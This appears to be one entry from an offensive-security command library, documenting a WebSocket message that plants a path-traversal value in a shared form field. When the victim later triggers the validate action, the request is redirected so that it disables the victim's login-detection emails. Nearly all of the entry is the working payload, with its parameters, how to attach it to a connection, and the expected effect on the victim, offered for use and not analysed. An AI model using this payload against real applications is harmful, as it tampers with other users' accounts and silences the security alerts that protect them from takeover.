---
id: cmd-837328-form-update-preferences
data: >-
  ws.send(JSON.stringify({type: 'form-update', element: '#algo-id', value:
  '/../../../../../users/update_preferences?prefs%5Bsend_login_detected_email%5D=false',
  clientId: 'x', roomId: '5ce6e50b298f7c6e0acb68c6'}));
tags:
  - websocket
  - path-traversal
  - exploitation
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:27.989Z'
verified: false
validated: true
submitted: true
---
# websocket-form-update-preferences

## Command

```javascript
ws.send(JSON.stringify({
  type: 'form-update',
  element: '#algo-id',
  value: '/../../../../../users/update_preferences?prefs%5Bsend_login_detected_email%5D=false',
  clientId: 'x',
  roomId: '5ce6e50b298f7c6e0acb68c6'
}));
```

## Description

Injects a path traversal payload via WebSocket to set #algo-id, redirecting the validate endpoint to update user preferences and disable login detection emails when victim triggers the action.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| type | Event type | Yes |
| element | Target selector | Yes |
| value | Traversal payload with params | Yes |
| clientId | Identifier | Yes |
| roomId | Room ID | Yes |

## Examples

### Basic Usage

```javascript
// As above
```

### Advanced Usage

Integrate with connection:

```javascript
ws.onopen = () => { ws.send(/* payload */); };
```

## Expected Output

#algo-id set to traversal; victim's subsequent POST disables email notifications.

## Related

- [[commands/websocket-form-update-basic]]
- [[procedures/Send-Malicious-WebSocket-Form-Update]]
